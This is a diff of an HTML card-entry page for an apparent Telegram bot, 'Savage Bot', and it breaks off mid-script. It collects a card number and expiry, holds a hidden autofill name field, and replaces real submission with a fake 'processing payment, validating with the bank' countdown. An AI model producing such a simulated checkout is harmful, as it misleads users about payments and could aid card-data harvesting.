@@ -3,42 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Savage Bot | Checkout</title>
+    <title>Savage Bot | Pago</title>
     <style>
         body { background-color: #0b0e14; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: #151921; padding: 25px; border-radius: 15px; width: 340px; border: 1px solid #2a2f3b; box-shadow: 0 10px 40px rgba(0,0,0,0.6); }
-        .card-preview { background: linear-gradient(135deg, #1a1a2e, #16213e); padding: 20px; border-radius: 12px; margin-bottom: 25px; border: 1px solid #4e4e8e; position: relative; overflow: hidden; }
-        .chip { width: 40px; height: 30px; background: #c0c0c0; border-radius: 4px; margin-bottom: 15px; }
-        .card-num-text { font-size: 1.2rem; letter-spacing: 3px; color: #fff; margin-bottom: 10px; }
-        .label { font-size: 11px; color: #8a8a8a; text-transform: uppercase; margin-bottom: 5px; display: block; }
-        input { width: 100%; padding: 14px; margin-bottom: 15px; background: #080a0f; border: 1px solid #343a46; border-radius: 8px; color: #00ffcc; font-size: 16px; box-sizing: border-box; }
-        .row { display: flex; gap: 10px; }
-        button { width: 100%; padding: 18px; background: #2a2a4e; border: 1px solid #4e4e8e; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        .container { background: #151921; padding: 25px; border-radius: 20px; width: 340px; border: 1px solid #2a2f3b; box-shadow: 0 15px 50px rgba(0,0,0,0.8); text-align: center; }
+        .card-visual { background: linear-gradient(135deg, #1a1a40, #16213e); padding: 20px; border-radius: 15px; margin-bottom: 20px; border: 1px solid #3d3d7e; text-align: left; }
+        .chip { width: 40px; height: 30px; background: #c0c0c0; border-radius: 4px; margin-bottom: 10px; }
+        label { font-size: 12px; color: #8a8a8a; text-transform: uppercase; display: block; margin-top: 15px; text-align: left; }
+        input { width: 100%; padding: 14px; margin-top: 8px; background: #080a0f; border: 1px solid #343a46; border-radius: 10px; color: #00ffcc; font-size: 16px; box-sizing: border-box; }
+        button { width: 100%; padding: 18px; background: #2a2a4e; border: 1px solid #4e4e8e; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; margin-top: 25px; text-transform: uppercase; }
+        
+        /* Estilos del contador */
+        #timer-box { display: none; margin-top: 20px; }
+        .number { font-size: 40px; color: #00ffcc; font-weight: bold; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
-<div class="container">
-    <div class="card-preview">
-        <div class="chip"></div>
-        <div class="card-num-text">#### #### #### ####</div>
-        <div style="font-size: 10px; color: #a0a0c0;">Savage Bot | @SavageOficialBot</div>
-    </div>
-    <form action="https://www.google.com" method="GET">
-        <label>▶ NÚMERO DE TARJETA</label>
-        <input type="text" name="cc-number" autocomplete="cc-number" inputmode="numeric" placeholder="4242 4242 4242 4242" required>
-        <div class="row">
-            <div style="flex: 1;">
-                <label>▶ MES (MM)</label>
-                <input type="text" name="cc-exp-month" autocomplete="cc-exp-month" placeholder="01" maxlength="2" required>
+    <div class="container">
+        <div id="main-content">
+            <div class="card-visual">
+                <div class="chip"></div>
+                <div style="font-size: 1.2rem; letter-spacing: 2px;">#### #### #### ####</div>
             </div>
-            <div style="flex: 1;">
-                <label>▶ AÑO (AA)</label>
-                <input type="text" name="cc-exp-year" autocomplete="cc-exp-year" placeholder="28" maxlength="2" required>
-            </div>
+            
+            <form id="payForm">
+                <label>▶ NÚMERO DE TARJETA</label>
+                <input type="text" id="card" name="cc-number" autocomplete="cc-number" placeholder="4242 4242 4242 4242" required>
+                
+                <div style="display: flex; gap: 10px;">
+                    <input type="text" name="cc-exp-month" autocomplete="cc-exp-month" placeholder="MM" maxlength="2" required style="flex:1">
+                    <input type="text" name="cc-exp-year" autocomplete="cc-exp-year" placeholder="AA" maxlength="2" required style="flex:1">
+                </div>
+                <input type="hidden" name="cc-name" autocomplete="cc-name" value="Antonio Corrales">
+                <button type="submit">AGREGAR TARJETA</button>
+            </form>
         </div>
-        <input type="hidden" name="cc-name" value="Antonio Corrales">
-        <button type="submit">AGREGAR TARJETA</button>
-    </form>
-</div>
-</body>
-</html>
+
+        <div id="timer-box">
+            <h3 style="color: #8a8a8a;">PROCESANDO PAGO...</h3>
+            <div class="number" id="countdown">3</div>
+            <p style="font-size: 12px; color: #555;">Validando con el banco</p>
+        </div>
+    </div>
+
+<script>
+    document.getElementById('payForm').onsubmit = function(e) {
+        e.preventDefault(); // Evitamos que se vaya a Google
+        
+        // Ocultamos el formulario y mostramos el contador
+        document.getElementById('main-content').style.display = 'none';
+        document.getElementById('timer-box').style.
